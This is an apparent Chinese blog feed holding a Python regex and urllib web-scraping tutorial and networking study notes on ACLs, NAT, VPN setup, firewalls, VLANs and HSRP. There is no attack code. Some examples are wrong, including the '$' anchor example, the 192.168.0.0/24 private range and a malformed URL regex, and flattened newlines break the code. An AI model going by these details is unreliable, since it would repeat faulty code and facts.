class=" language-bash"><code class="language-bash">re.findall<span class="token punctuation">(</span><span class="token string">"go+gle"</span>,<span class="token string">"I like google not ggle goooogle and gogle"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#*左邻为o,即o出现1次或多次，输出为 google goooogle gogle</span></code></pre></li><li><p><font color="#fb8c00">? </font>号 匹配左邻字符出现0次或1次</p><pre class=" language-bash"><code class="language-bash">re.findall<span class="token punctuation">(</span><span class="token string">"go?gle"</span>,<span class="token string">"I like google not ggle goooogle and gogle"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#*左邻为o,即o出现0次或1次，输出为 ggle gogle</span></code></pre></li><li><p><font color="#fb8c00">{}</font> 定义左邻字符出现的个数</p><pre class=" language-bash"><code class="language-bash">re.findall<span class="token punctuation">(</span><span class="token string">"go{2，3}gle"</span>,<span class="token string">"I like google not ggle goooogle and gogle"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#*左邻为o,即o出现2-3次，输出为 google</span></code></pre></li><li><p><font color="#fb8c00">^</font> 匹配是否以某个字符开头</p><pre class=" language-bash"><code class="language-bash">re.findall<span class="token punctuation">(</span><span class="token string">"^I like"</span>,<span class="token string">"I like blue"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#输出为I like</span></code></pre></li><li><p><font color="#fb8c00">$</font> 匹配是否以某个字符结尾</p></li></ul><pre class=" language-bash"><code class="language-bash">re.findall<span class="token punctuation">(</span><span class="token string">"blue&amp;"</span>,<span class="token string">"I like blue"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#输出为blue</span></code></pre><h3 id="模式修正符"><a href="#模式修正符" class="headerlink" title="模式修正符"></a>模式修正符</h3><ul><li>I 匹配时忽略大小写</li><li>M 多行匹配</li><li>L 本地化识别匹配</li><li>U unicode</li><li>S 让.匹配包括换行符</li></ul><pre class=" language-bash"><code class="language-bash">re.search<span class="token punctuation">(</span><span class="token string">"pyt"</span>,<span class="token string">"Python"</span>,re.I<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#忽略大小写，Pyt</span></code></pre><h3 id="贪婪模式和懒惰模式"><a href="#贪婪模式和懒惰模式" class="headerlink" title="贪婪模式和懒惰模式"></a>贪婪模式和懒惰模式</h3><ul><li>贪婪模式的核心就是尽可能多地匹配</li><li>懒惰模式的核心就是尽可能少地匹配</li></ul><h4 id="贪婪模式"><a href="#贪婪模式" class="headerlink" title="贪婪模式"></a>贪婪模式</h4><pre class=" language-bash"><code class="language-bash">re.search<span class="token punctuation">(</span><span class="token string">"p.*y"</span>,<span class="token string">"pythony"</span>,re.I<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#一直匹配到最后一个y，为pythony</span></code></pre><h4 id="懒惰模式"><a href="#懒惰模式" class="headerlink" title="懒惰模式"></a>懒惰模式</h4><pre class=" language-bash"><code class="language-bash">re.search<span class="token punctuation">(</span><span class="token string">"p.*?y"</span>,<span class="token string">"pythony"</span>,re.I<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#匹配第一个y，py</span></code></pre><h3 id="正则表达式匹配实例"><a href="#正则表达式匹配实例" class="headerlink" title="正则表达式匹配实例"></a>正则表达式匹配实例</h3><h4 id="匹配-com-cn网站"><a href="#匹配-com-cn网站" class="headerlink" title="匹配.com/.cn网站"></a>匹配.com/.cn网站</h4><pre class=" language-bash"><code class="language-bash">http://www.baidu.com<span class="token punctuation">[</span>a-zA-Z<span class="token punctuation">]</span>+://<span class="token punctuation">[</span>^\s<span class="token punctuation">]</span>*<span class="token punctuation">[</span>.com<span class="token operator">|</span>.cn<span class="token punctuation">]</span></code></pre><h2 id="urllib库"><a href="#urllib库" class="headerlink" title="urllib库"></a>urllib库</h2><p>urllib库是Python中一个最基本的网络请求库，可以模拟浏览器的行为，向指定的服务器发送一个请求，并可以保存服务器返回的数据。</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="urlopen"><a href="#urlopen" class="headerlink" title="urlopen"></a>urlopen</h4><h5 id="设置代理服务器"><a href="#设置代理服务器" class="headerlink" title="设置代理服务器"></a>设置代理服务器</h5><p>使用urllib库需开启代理，否则屏蔽爬虫的浏览器无法获取信息：<br><img src="https://pic.downk.cc/item/5e9e7b5fc2a9a83be547b719.png" alt=""><br><img src="https://pic.downk.cc/item/5e9e7b71c2a9a83be547beae.png" alt=""></p><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p>在python3中urllib库中，所有和网络请求相关的方法，都集成到urllib.request模块下，下面是urlopen函数的基本使用</p><pre class=" language-bash"><code class="language-bash">from urllib <span class="token function">import</span> requestresp <span class="token operator">=</span> request.urlopen<span class="token punctuation">(</span><span class="token string">'https://graph.baidu.com'</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#返回该请求的响应</span>print<span class="token punctuation">(</span>resp.read<span class="token punctuation">(</span><span class="token punctuation">))</span></code></pre><h4 id="urlretrieve"><a href="#urlretrieve" class="headerlink" title="urlretrieve"></a>urlretrieve</h4><p><font color="#fb8c00">urlretreive(网址，本地文件存储路径)</font>  直接下载网页到本地(只下载静态内容)</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> urllib.requesturllib.request.urlretrieve<span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span>,<span class="token string">"C:\\Users\\zby\\Desktop\\baidu.html"</span><span class="token punctuation">)</span></code></pre><h4 id="urlcleanup"><a href="#urlcleanup" class="headerlink" title="urlcleanup"></a>urlcleanup</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> urllib.requesturllib.request.urlcleanup   <span class="token comment" spellcheck="true">#清除缓存</span></code></pre><h4 id="info"><a href="#info" class="headerlink" title="info"></a>info</h4><p>用来以固定格式打印响应消息主体。该方法的对象为response(object)，而不是response返回的内容(string)。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> urllib.request<span class="token function">file</span> <span class="token operator">=</span> urllib.request.urlopen<span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>file.info<span class="token punctuation">(</span><span class="token punctuation">))</span></code></pre><h4 id="getcode"><a href="#getcode" class="headerlink" title="getcode"></a>getcode</h4><p>返回http请求状态码</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> urllib.request<span class="token function">file</span> <span class="token operator">=</span> urllib.request.urlopen<span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>file.getcode<span class="token punctuation">(</span><span class="token punctuation">))</span></code></pre><h4 id="geturl"><a href="#geturl" class="headerlink" title="geturl"></a>geturl</h4><p>获取当前访问网页的url</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> urllib.request<span class="token function">file</span> <span class="token operator">=</span> urllib.request.urlopen<span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>file.geturl<span class="token punctuation">(</span><span class="token punctuation">))</span></code></pre><h3 id="超时设置"><a href="#超时设置" class="headerlink" title="超时设置"></a>超时设置</h3><p>由于网络速度或对方服务器的问题，我们爬取一个网页的时候，都需要时间。我们访问一个网页，如果该网页长时间未响应，那么我们的系统就会判断该网页超时，无法打开该网页。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> urllib.request<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>0,10<span class="token punctuation">)</span>:        <span class="token function">file</span> <span class="token operator">=</span> urllib.request.urlopen<span class="token punctuation">(</span><span class="token string">"http://www.baidu.com"</span>,timeout<span class="token operator">=</span>1<span class="token punctuation">)</span>        try:            print<span class="token punctuation">(</span>file.read<span class="token punctuation">(</span><span class="token punctuation">)</span>.decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">))</span>        except Exception as err:            print<span class="token punctuation">(</span><span class="token string">"出现异常"</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><h2 id="简单爬虫"><a href="#简单爬虫" class="headerlink" title="简单爬虫"></a>简单爬虫</h2><h3 id="获取网页所有的html代码"><a href="#获取网页所有的html代码" class="headerlink" title="获取网页所有的html代码"></a>获取网页所有的html代码</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> urllib.requestclass GetHtml<span class="token punctuation">(</span>object<span class="token punctuation">)</span>:    def __init__<span class="token punctuation">(</span>self,URL<span class="token punctuation">)</span>:        self.url <span class="token operator">=</span> URL        self.res <span class="token operator">=</span> None    def response<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:    <span class="token comment" spellcheck="true">#获取html页面的代码</span>        self.res <span class="token operator">=</span> urllib.request.urlopen<span class="token punctuation">(</span>self.url<span class="token punctuation">)</span>        <span class="token keyword">return</span> self.res.read<span class="token punctuation">(</span><span class="token punctuation">)</span>html <span class="token operator">=</span> GetHtml<span class="token punctuation">(</span><span class="token string">'http://graph.baidu.com'</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>html.response<span class="token punctuation">(</span><span class="token punctuation">))</span></code></pre><p>以上代码发出的请求在服务器端显示的User-Agent为python，我们需要修改User-Agent为我们的正常浏览器信息。</p><h4 id="查看本地浏览器的信息"><a href="#查看本地浏览器的信息" class="headerlink" title="查看本地浏览器的信息"></a>查看本地浏览器的信息</h4><p>在浏览器中点F12打开调试平台：<br><img src="https://pic.downk.cc/item/5e9e9231c2a9a83be5564097.png" alt=""></p><h4 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> urllib.requestclass GetHtml<span class="token punctuation">(</span>object<span class="token punctuation">)</span>:    def __init__<span class="token punctuation">(</span>self,URL,HEAD<span class="token punctuation">)</span>:        self.url <span class="token operator">=</span> URL        self.response <span class="token operator">=</span> None     <span class="token comment" spellcheck="true">#响应</span>        self.head <span class="token operator">=</span> HEAD        self.request <span class="token operator">=</span> None   <span class="token comment" spellcheck="true">#请求</span>    def getContent<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        <span class="token comment" spellcheck="true">#修改请求头</span>        self.request <span class="token operator">=</span> urllib.request.Request<span class="token punctuation">(</span>self.url<span class="token punctuation">)</span>        self.request.add_header<span class="token punctuation">(</span><span class="token string">"user-agent"</span>,self.head<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#读取响应</span>        self.response <span class="token operator">=</span> urllib.request.urlopen<span class="token punctuation">(</span>self.request<span class="token punctuation">)</span>        <span class="token keyword">return</span> self.response.read<span class="token punctuation">(</span><span class="token punctuation">)</span>.decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#进行编码，否则在提取时会出现错误</span>html <span class="token operator">=</span> GetHtml<span class="token punctuation">(</span><span class="token string">"https://graph.baidu.com"</span>,<span class="token string">"user-agent消息头"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>html.getContent<span class="token punctuation">(</span><span class="token punctuation">))</span></code></pre><h2 id="爬虫实例"><a href="#爬虫实例" class="headerlink" title="爬虫实例"></a>爬虫实例</h2><h3 id="爬取CSDN提取QQ群"><a href="#爬取CSDN提取QQ群" class="headerlink" title="爬取CSDN提取QQ群"></a>爬取CSDN提取QQ群</h3><pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> urllib.request<span class="token function">import</span> reclass GetHtml:    def __init__<span class="token punctuation">(</span>self,URL,HEAD<span class="token punctuation">)</span>:        self.url <span class="token operator">=</span> URL        self.request <span class="token operator">=</span> None        self.response <span class="token operator">=</span> None        self.header <span class="token operator">=</span> HEAD    <span class="token comment" spellcheck="true">#获取响应</span>    def getContent<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        <span class="token comment" spellcheck="true">#获取请求</span>        self.request <span class="token operator">=</span> urllib.request.Request<span class="token punctuation">(</span>self.url<span class="token punctuation">)</span>        self.request.add_header<span class="token punctuation">(</span><span class="token string">"user-agent"</span>,self.header<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#发送请求</span>        self.response <span class="token operator">=</span> urllib.request.urlopen<span class="token punctuation">(</span>self.request<span class="token punctuation">)</span>        <span class="token keyword">return</span> self.response.read<span class="token punctuation">(</span><span class="token punctuation">)</span>.decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#进行转码，否则会发送错误</span>    <span class="token comment" spellcheck="true">#获取QQ群信息</span>    def getQQ<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        qq <span class="token operator">=</span> re.compile<span class="token punctuation">(</span><span class="token string">"&lt;p>(\d*?)&lt;/p>"</span><span class="token punctuation">)</span>.findall<span class="token punctuation">(</span>self.getContent<span class="token punctuation">(</span><span class="token punctuation">))</span>        <span class="token keyword">return</span> qqhtml <span class="token operator">=</span> GetHtml<span class="token punctuation">(</span><span class="token string">"https://edu.csdn.net/huiyiCourse/detail/253"</span>,<span class="token string">"浏览器user-agent"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>html.getQQ<span class="token punctuation">(</span><span class="token punctuation">))</span></code></pre><p>此例中正则表达式的书写要查看该页面的html源码，根据html书写规律构造正则表达式<br><img src="https://pic.downk.cc/item/5ea12b6ac2a9a83be5a8137e.png" alt=""></p><h3 id="提取豆瓣出版社信息"><a href="#提取豆瓣出版社信息" class="headerlink" title="提取豆瓣出版社信息"></a>提取豆瓣出版社信息</h3><p>豆瓣网址(<a href="https://read.douban.com/provider/all" target="_blank" rel="noopener">https://read.douban.com/provider/all</a>) ，代码结构如上，只需将正则表达式改为：</p><pre class=" language-bash"><code class="language-bash">douban <span class="token operator">=</span> re.compile<span class="token punctuation">(</span><span class="token string">"&lt;div class=\"name\">(.*?)&lt;/div>"</span><span class="token punctuation">)</span>.findall<span class="token punctuation">(</span>self.getContent<span class="token punctuation">(</span><span class="token punctuation">))</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>外网规划</title>
      <link href="/2020/04/03/firewall/"/>
      <url>/2020/04/03/firewall/</url>
      
        <content type="html"><![CDATA[<h2 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h2><p>ACL(Access Control List,访问控制列表)</p><ul><li>ACL是一种包过滤技术</li><li>ACL基于IP包头地址、四层TCP/UDP头部的端口号、五层数据，基于三层四层数据过滤</li><li>ACL在路由器上配置，也可以在防火墙上配置(一般称为策略)，防火墙主要过滤三层四层数据包(过滤网络流量)，对于应用层数据包没有限制(IPS可以过滤应用层数据包)</li></ul><h3 id="ACL分类"><a href="#ACL分类" class="headerlink" title="ACL分类"></a>ACL分类</h3><ul><li>标准ACL：表号1-99，只能基于源IP对数据包进行过滤</li><li>扩展ACL：</li></ul><h3 id="ACL原理"><a href="#ACL原理" class="headerlink" title="ACL原理"></a>ACL原理</h3><ul><li>ACL表必须应用到接口的进/出方向才能生效</li><li>一个接口的一个方向只能应用一张表</li><li>进还是出方向应用取决于流量控制总方向</li><li>ACL表是严格自上而下检查每一条，所以要注意书写顺序</li><li>每一条由条件和动作组成，该条件只对指定对象起作用，当某流量没有满足条件时，继续往下检查(如ACL表中第一条显示应用层数据包不让过，网络层数据包到达时，不满足第一条，继续往下寻找条件)</li><li>标准ACL尽量写在靠近目标的地方</li></ul><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><p>NAT(Network Address Translation,网络地址转换)，主要实现公网私网的IP地址转换，一般在路由器或防火墙上配置，不建议在三层交换机上配置。</p><ul><li>产生的原因：IPV4地址严重不够用(ABC类可以使用，D类组播，E类科研)</li><li>IP地址分为公网IP和私网IP，公网IP只能在公网使用，私网IP只能在内网使用，公网上不允许出现私有IP地址。</li><li>私网IP可以重复在内网使用(一个IP地址可以在不同的内网中使用)</li></ul><p><img src="https://pic.downk.cc/item/5e8ade2f504f4bcb04f35ee1.png" alt=""></p><h3 id="私有IP地址范围"><a href="#私有IP地址范围" class="headerlink" title="私有IP地址范围"></a>私有IP地址范围</h3><p>从IPV4 ABC类地址中抽出一部分作为私有IP地址：</p><ul><li>A类：<font color="#fb8c00">10.0.0.0/8</font>  10开头的</li><li>B类：<font color="#fb8c00">172.16.0.0/16-172.31.0.0/16</font> 172.16开头一直到172.31开头的</li><li>C类：<font color="#fb8c00">192.168.0.0/24</font> 192.168开头的<br>除上述以外的ABC类地址都是公网IP地址，需花钱购买(公网IP地址可以在搜索引擎上查询该IP属于哪个国家地区)</li></ul><h3 id="NAT分类"><a href="#NAT分类" class="headerlink" title="NAT分类"></a>NAT分类</h3><p><img src="https://pic.downk.cc/item/5e8ade44504f4bcb04f36ff4.png" alt=""><br>地址转换原则：数据由内网发送到外网：转换源IP，从外网发送到内网：转换目标IP</p><ul><li>静态NAT:在上图黄色路由器上有一张NAT地址转换表 (192.1-100.1)，一个公网IP地址一次只能对应一个私网IP地址，此地址转换表由工程师手动配置，内外网端口。此技术可以用于外网访问内网服务器时使用</li><li>动态NAT：NAT地址转换表动态生成，有内部地址池和外部地址池，将内网网段放入内部地址池，将购买的公网IP地址放入外部地址池，然后在两个池子之间做一个动态NAT映射，一个公网IP地址一次也只能对应一个私网IP地址</li><li>PAT(端口地址转换)：也称端口复用技术，在动态NAT的基础上加上overload(复用)，如果内网访问外网，会在黄色路由器的部分将源IP地址和源端口进行转换，并生成NAT转换表(只有内网访问外网时才会自动生成NAT转换表)。当数据包从外网回内网时，通过端口识别不同的IP地址，实现了一个公网IP地址可以同时对应多个私网IP地址。当一个私网IP地址不访问外网后，NAT转换表会自动删除</li></ul><h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>VPN(Virtual Private Network),虚拟专用网。VPN可以实现在不安全的网络上，安全的传输数据，就像一个专网。VPN只是一个技术，使用PKI技术，来保证数据安全三要素。(机密性、完整性、身份验证)</p><h3 id="VPN的类型"><a href="#VPN的类型" class="headerlink" title="VPN的类型"></a>VPN的类型</h3><ul><li>远程访问VPN：一般用在个人到安全连接企业内部，出差办公/在家办公，安全连接内网时使用。一般公司部署VPN服务器，员工在外拨号连接VPN即可。(SSL VPN/PPTP VPN/L2TP VPN)</li><li>点到点VPN：一般用在企业到企业安全连接，需要在两个企业总出口设备之间建立VPN通道。合并两家企业内网(IPsecVPN)</li></ul><h3 id="VPN隧道技术"><a href="#VPN隧道技术" class="headerlink" title="VPN隧道技术"></a>VPN隧道技术</h3><p>VPN隧道技术：重新封装技术+加密认证技术</p><ul><li>传输模式：只加密上层数据，不加密私有IP包头，速度快</li><li>隧道模式：加密整个私有IP数据包，包括IP数据包头，更安全，速度慢</li></ul><h3 id="IPsecVPN"><a href="#IPsecVPN" class="headerlink" title="IPsecVPN"></a>IPsecVPN</h3><p>IPsecVPN分为两大阶段：管理连接、数据连接</p><h4 id="管理连接"><a href="#管理连接" class="headerlink" title="管理连接"></a>管理连接</h4><ul><li>目的：通信双方设备通过非对称加密算法加密对称加密算法所使用的对称密钥</li></ul><h4 id="数据连接"><a href="#数据连接" class="headerlink" title="数据连接"></a>数据连接</h4><ul><li>目的：通过对称加密算法加密实际所要传输的私网数据。</li></ul><h3 id="远程访问VPN"><a href="#远程访问VPN" class="headerlink" title="远程访问VPN"></a>远程访问VPN</h3><ul><li>搭建VPN服务器</li><li>VPN服务器需要对VPN客户端进行身份验证</li><li>VPN服务器需要给VPN客户端下发权限和IP地址</li></ul><h3 id="VPN搭建实验"><a href="#VPN搭建实验" class="headerlink" title="VPN搭建实验"></a>VPN搭建实验</h3><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>实验对象：WindowsXP、Win Server 2003、Win Server 2008<br>实验说明：2003充当VPN服务器，2003的一个网卡与XP在同一网段，另一网卡与2008在同一网段，借助2003VPN服务器，XP与2008实现通信(为了突出实验结果，可在2008IIS服务器里放一个网页(详见IIS篇)供其他计算机访问)<br>实验拓扑图：<br><img src="https://pic.downk.cc/item/5e8ade57504f4bcb04f38006.png" alt=""></p><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h4><h5 id="设置网段"><a href="#设置网段" class="headerlink" title="设置网段"></a>设置网段</h5><ol><li>2003作为VPN服务器需要两个网卡，在虚拟机设置中选择添加-&gt;网络适配器，在网络连接里需要区分两个连接对应的网段(可以使用断开连接的方式查看本连接对应的网段)，一个网卡接vmnet1,一个网卡接vmnet2</li><li>设置XP接vmnet1,2008接vmnet2</li></ol><h5 id="配置IP地址"><a href="#配置IP地址" class="headerlink" title="配置IP地址"></a>配置IP地址</h5><ol><li>XP：100.1.1.2 </li><li>2003net1:100.1.1.1 net2:200.1.1.1</li><li>2008:200.1.1.2<br>此时XP访问不了2008的网页，2003可以访问</li></ol><h5 id="安装VPN服务软件"><a href="#安装VPN服务软件" class="headerlink" title="安装VPN服务软件"></a>安装VPN服务软件</h5><ol><li>windows/linux服务器都自带了VPN服务器软件：开始-&gt;管理工具-&gt;路由和远程访问<br><img src="https://pic.downk.cc/item/5e8984c5504f4bcb04cbb840.png" alt=""></li><li>自定义配置-&gt;下一步-&gt;勾选VPN访问、拨号访问、NAT和基本防火墙-&gt;下一步完成</li><li>使用<font color="#fb8c00">netstat -an</font>查看服务是否开启(PPTP/L2TP VPN的服务端口号为tcp 1723)</li></ol><h5 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h5><p>因为客户端拨号需要使用服务器用户，所以2003需要新建一个普通用户用于拨号。<br><img src="https://pic.downk.cc/item/5e898751504f4bcb04ce571e.png" alt=""></p><h5 id="VPN服务器分发IP地址"><a href="#VPN服务器分发IP地址" class="headerlink" title="VPN服务器分发IP地址"></a>VPN服务器分发IP地址</h5><p><img src="https://pic.downk.cc/item/5e898832504f4bcb04cf358e.png" alt=""></p><h5 id="开启NAT服务"><a href="#开启NAT服务" class="headerlink" title="开启NAT服务"></a>开启NAT服务</h5><p>将vmnet1的IP地址转换为vmnet2的IP地址<br><img src="https://pic.downk.cc/item/5e8989aa504f4bcb04d04f9e.png" alt=""><br>选择共用接口链接到Internet-&gt;在此接口上启用NAT-&gt;确定</p><h5 id="客户端拨号"><a href="#客户端拨号" class="headerlink" title="客户端拨号"></a>客户端拨号</h5><p><img src="https://pic.downk.cc/item/5e898bef504f4bcb04d27bde.png" alt=""><br>虚拟专用网络连接-&gt;下一步-&gt;VPN服务器写上100.1.1.1-&gt;完成-&gt;拨号输入服务器注册的拨号用户的用户名和密码<br>现在在XP网页中输入200.1.1.2,可以看见2008网页</p><h4 id="查看电脑路由表"><a href="#查看电脑路由表" class="headerlink" title="查看电脑路由表"></a>查看电脑路由表</h4><p>使用以下终端命令：</p><pre class=" language-bash"><code class="language-bash">route print</code></pre><p><img src="https://pic.downk.cc/item/5e89922e504f4bcb04d8ce1c.png" alt=""></p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>防火墙：是具备安全防护功能的网络设备(基于IP和端口号隔离，三四层隔离)</p><ul><li>隔离网络：将需要保护的网络与不可信任的网络进行隔离，隐藏信息并进行安全防护</li><li>防火墙策略：默认所有数据包都不能通过，在策略上写能放行的记录</li></ul><h3 id="防火墙的功能"><a href="#防火墙的功能" class="headerlink" title="防火墙的功能"></a>防火墙的功能</h3><ul><li>访问控制(策略)</li><li>攻击防护(主要用于三四层攻击)</li><li>冗余设计</li><li>路由、交换</li><li>日志记录</li><li>虚拟专网VPN</li><li>NAT</li></ul><blockquote><p>注：防火墙比路由器多出来的功能是前两个功能</p></blockquote><h3 id="防火墙的原理"><a href="#防火墙的原理" class="headerlink" title="防火墙的原理"></a>防火墙的原理</h3><h4 id="区域隔离"><a href="#区域隔离" class="headerlink" title="区域隔离"></a>区域隔离</h4><p>防火墙区域概念：</p><ul><li>内部区域</li><li>DMZ区域：隔离区，也称“非军事化区/停火区”，外部区域可以有限访问的区域，内网服务器需要对外发布的部分(网页/邮箱等)</li><li>外部区域</li></ul><h3 id="防火墙的分类"><a href="#防火墙的分类" class="headerlink" title="防火墙的分类"></a>防火墙的分类</h3><h4 id="按防火墙的形态"><a href="#按防火墙的形态" class="headerlink" title="按防火墙的形态"></a>按防火墙的形态</h4><ul><li>软件防火墙</li><li>硬件防火墙</li></ul><h4 id="按技术实现"><a href="#按技术实现" class="headerlink" title="按技术实现"></a>按技术实现</h4><ul><li>包过滤防火墙</li><li>状态检测包过滤防火墙</li><li>应用(代理)防火墙</li><li>WAF(Web Application FireWall,Web应用防火墙)</li><li>应用层防火墙</li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识点总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网规划</title>
      <link href="/2020/04/02/lan/"/>
      <url>/2020/04/02/lan/</url>
      
        <content type="html"><![CDATA[<h2 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h2><p>VLAN(Virtural LAN,虚拟局域网)</p><h3 id="控制广播"><a href="#控制广播" class="headerlink" title="控制广播"></a>控制广播</h3><p>广播会增加网络/终端负担，传播病毒。控制广播 = 隔离广播域</p><ul><li>路由器隔离广播(物理隔离广播)</li><li>采用VLAN技术控制广播：VLAN技术是在交换机上实现的且是通过逻辑隔离进行划分的广播域</li></ul><h3 id="VLANID"><a href="#VLANID" class="headerlink" title="VLANID"></a>VLANID</h3><p>一个VLANID(一个交换机接口就是一个VLANID)标识一个虚拟局域网。在管理交换机里就有一个VLAN表，一个VLAN = 一个广播域 = 一个网段</p><h3 id="VLAN的类型"><a href="#VLAN的类型" class="headerlink" title="VLAN的类型"></a>VLAN的类型</h3><ul><li>静态VLAN：手工配置/基于端口划分的VLAN</li><li>动态VLAN：手工配置/基于MAC地址划分</li></ul><h2 id="trunk"><a href="#trunk" class="headerlink" title="trunk"></a>trunk</h2><p>trunk，被称为中继链路或公共链路。</p><ul><li>作用：允许所有VLAN数据通过trunk链路</li><li>方法：通过在数据帧上加标签，来区分不同的vlan数据</li></ul><h3 id="trunk标签"><a href="#trunk标签" class="headerlink" title="trunk标签"></a>trunk标签</h3><ul><li>ISL标签：cisco私有标签，标签大小为30字节(帧前26字节，帧尾4字节)</li><li>802.1q标签：公有协议，所有厂家都支持，标签大小4字节(在数据帧中间加入)。属于内部标签</li></ul><h3 id="交换机端口链路类型"><a href="#交换机端口链路类型" class="headerlink" title="交换机端口链路类型"></a>交换机端口链路类型</h3><ul><li>接入端口：也称access端口，一般用于连接pc，只能属于某个vlan，也只能传输一个vlan的数据</li><li>中继端口：也称为trunk端口，一般用于连接其他交换机，属于公共端口，允许所有vlan数据通过</li></ul><h2 id="内部网络规划"><a href="#内部网络规划" class="headerlink" title="内部网络规划"></a>内部网络规划</h2><p>中大型企业内部网络结构：核心交换机(三层交换机)-&gt;二层交换机，网关在三层交换机里</p><h3 id="三层网络"><a href="#三层网络" class="headerlink" title="三层网络"></a>三层网络</h3><p>上万台PC端联网：<br><img src="https://pic.downk.cc/item/5e8add80504f4bcb04f2c4bd.png" alt=""></p><h3 id="HSRP协议-VRRP协议"><a href="#HSRP协议-VRRP协议" class="headerlink" title="HSRP协议/VRRP协议"></a>HSRP协议/VRRP协议</h3><p>HSRP(Hot Standby Route Protocol,热备份路由协议）,私有协议，用于备份网关，分配路由器。VRRP协议原理与HSRP协议相同，但是属于公有协议。<br><img src="https://pic.downk.cc/item/5e8add91504f4bcb04f2d214.png" alt=""></p><ul><li>进行热备份必须保证两个网关在同一个热备份组里(组ID范围为1-255)，没有大小之分。</li><li>组里必须有一个虚拟路由器，拥有一个虚拟IP地址。(在热备份组里拥有最高地位，由它指定活跃路由器/备份路由器)</li><li>HSRP优先级：1-255，默认为100(数字越大，优先级越高)</li><li>HSRP组成员通过定时发送hello包来交流，默认每隔3秒进行发送</li><li>所有PC端指向的路由器都是虚拟路由器，由虚拟路由器指向活跃路由器。</li></ul><h4 id="更换活跃路由器"><a href="#更换活跃路由器" class="headerlink" title="更换活跃路由器"></a>更换活跃路由器</h4><p>如果当前活跃路由器A出现问题，备份路由器B向其发送hello包10s(坚持时间)无应答，则备份路由器B向虚拟路由器报告申请成为活跃路由器。但是，一旦之前的活跃路由器A修复成功，此时的活跃路由器B就将控制权归还路由器A，自己变回备份路由器。</p><h5 id="占先权preempt"><a href="#占先权preempt" class="headerlink" title="占先权preempt"></a>占先权preempt</h5><p>拥有占先权的路由器不用坚持10秒，一旦活跃路由器没有响应hello包，或发现对方路由器优先级比自己低，立即抢占活跃路由的名分。</p><h5 id="配置跟踪track"><a href="#配置跟踪track" class="headerlink" title="配置跟踪track"></a>配置跟踪track</h5><p>跟踪外网端口状态，如果外网端口down掉，则自降优先级。</p>]]></content>
      
      
      <categories>
          
          <category> 知识点总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> HSRP </tag>
            
            <tag> VLAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件分析</title>
      <link href="/2020/03/23/reverse2/"/>
      <url>/2020/03/23/reverse2/</url>
      
